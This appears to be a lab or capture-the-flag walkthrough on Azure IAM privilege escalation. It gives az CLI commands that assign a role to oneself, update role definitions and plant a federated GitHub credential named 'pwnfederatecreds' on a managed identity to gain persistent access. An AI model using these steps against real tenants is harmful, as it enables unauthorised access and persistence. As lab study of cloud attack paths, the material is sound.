# Azure IAM

## Microsoft.Authorization/roleAssignments/write

Assign role to self:

```sh
az role assignment create --role "Storage Blob Data Reader" --assignee "2c917b41-9f58-4906-b6ea-a8c9c72d91f9" --scope "/subscriptions/cd9959a7-8b38-4902-897b-267815e9f42f/resourceGroups/iam-azure-labs/providers/Microsoft.Storage/storageAccounts/iamazurelab1d090e49d"
```

Get blob content:

```sh
az storage account list
az storage container list --account-name iamazurelab1d090e49d --auth-mode login
az storage blob list --account-name iamazurelab1d090e49d --auth-mode login -c flag
az storage blob download --account-name iamazurelab1d090e49d --auth-mode login -c flag -n flag.txt -f ./flag.txt
```

## Microsoft.Authorization/roleDefinitions/Write

Find assignments and get details:

```sh
az role assignment list --assignee "2e9d0644-49ee-4cc1-aae8-f5eb0e7086a6" --all --output table
az role definition update --role-definition role.json
```

For role definition

- Action: Controle plane actions (i.e. `Microsoft.Storage/storageAccounts/blobServices/containers/read`)
- DataAction: Data plane actions (i.e. `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read`)

## Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write

[Documentation](https://learn.microsoft.com/en-us/azure/developer/github/connect-from-azure-openid-connect)
[Azure Login Actions](https://github.com/Azure/login?tab=readme-ov-file#login-with-openid-connect-oidc-recommended)

Create the github action in `.github/workflow/<action_name>.yml`

```sh
az rest --method PUT \
  --uri "https://management.azure.com/subscriptions/cd9959a7-8b38-4902-897b-267815e9f42f/resourceGroups/iam-azure-labs/providers/Microsoft.ManagedIdentity/userAssignedIdentities/iam-azure-lab-3-identity/federatedIdentityCredentials/pwnfederatecreds?api-version=2023-01-31" \
  --headers "Content-Type=application/json" \
  --body '{"properties":{"issuer":"https://token.actions.githubusercontent.com","subject":"repo:sklaer/AzRTE:ref:refs/heads/main","audiences":["api://AzureADTokenExchange"]}}'
```

Then create the following GitHub environment secrets :

- `AZURE_CLIENT_ID`: the service principal client ID or user-assigned managed identity client ID => `az identity list`
- `AZURE_SUBSCRIPTION_ID`: the subscription ID
- `AZURE_TENANT_ID`: the tenant ID
